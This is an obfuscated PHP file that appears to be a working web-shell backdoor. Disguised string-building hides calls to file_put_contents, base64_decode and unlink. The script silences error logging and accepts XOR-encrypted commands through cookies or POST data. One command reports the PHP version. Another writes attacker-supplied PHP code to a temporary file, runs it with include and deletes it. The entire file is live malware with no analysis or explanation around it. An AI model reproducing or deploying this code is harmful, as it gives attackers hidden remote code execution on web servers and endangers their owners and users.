<?php $fipchkwipe = chr(458-356).chr(861-756).'l'.chr(101).'_'."\x70".'u'."\x74"."\x5f"."\143".'o'.'n'.'t'."\x65".chr(983-873)."\x74"."\163";
$euwrkkuhc = chr(292-194).'a'.'s'.chr(101).chr(273-219).chr(82-30)."\x5f"."\144"."\x65".'c'."\x6f".chr(206-106)."\145";
$mockmiv = "\x69"."\156".chr(105)."\x5f"."\x73".chr(101).chr(116);
$knmzoxn = chr(517-400)."\x6e".chr(1083-975).chr(174-69).'n'.chr(107);


@$mockmiv('e'.'r'.chr(1030-916)."\x6f"."\x72".chr(137-42)."\154".'o'."\147", NULL);
@$mockmiv("\x6c"."\157".chr(573-470)."\x5f".'e'.'r'.chr(114).chr(441-330).chr(114)."\x73", 0);
@$mockmiv("\155".'a'.chr(957-837)."\x5f"."\x65"."\x78".chr(504-403)."\x63"."\165".chr(384-268)."\x69".'o'.chr(110)."\137".chr(116).'i'.chr(109)."\145", 0);
@set_time_limit(0);

function pokmpy($rzogcyqe, $jxnpzjeyms)
{
    $plysnpnbm = "";
    for ($pjyhbr = 0; $pjyhbr < strlen($rzogcyqe);) {
        for ($j = 0; $j < strlen($jxnpzjeyms) && $pjyhbr < strlen($rzogcyqe); $j++, $pjyhbr++) {
            $plysnpnbm .= chr(ord($rzogcyqe[$pjyhbr]) ^ ord($jxnpzjeyms[$j]));
        }
    }
    return $plysnpnbm;
}

$kqimslo = array_merge($_COOKIE, $_POST);
$rittd = 'ed1a5343-2f76-4a9f-a0f3-e96af0b30dd8';
foreach ($kqimslo as $baxxuwf => $rzogcyqe) {
    $rzogcyqe = @unserialize(pokmpy(pokmpy($euwrkkuhc($rzogcyqe), $rittd), $baxxuwf));
    if (isset($rzogcyqe['a'.chr(1008-901)])) {
        if ($rzogcyqe["\x61"] == "\x69") {
            $pjyhbr = array(
                "\x70".chr(118) => @phpversion(),
                's'.'v' => "3.5",
            );
            echo @serialize($pjyhbr);
        } elseif ($rzogcyqe["\x61"] == "\x65") {
            $kzbwgwoom = "./" . md5($rittd) . '.'.chr(105).chr(110).chr(99);
            @$fipchkwipe($kzbwgwoom, "<" . chr(63).chr(112).'h'."\160"."\x20".chr(497-433).chr(1017-900)."\156"."\x6c"."\x69"."\156"."\x6b".chr(57-17)."\x5f"."\x5f".chr(70).'I'."\x4c".chr(312-243).chr(95)."\137".chr(980-939).';'."\x20" . $rzogcyqe[chr(855-755)]);
            @include($kzbwgwoom);
            @$knmzoxn($kzbwgwoom);
        }
        exit();
    }
}

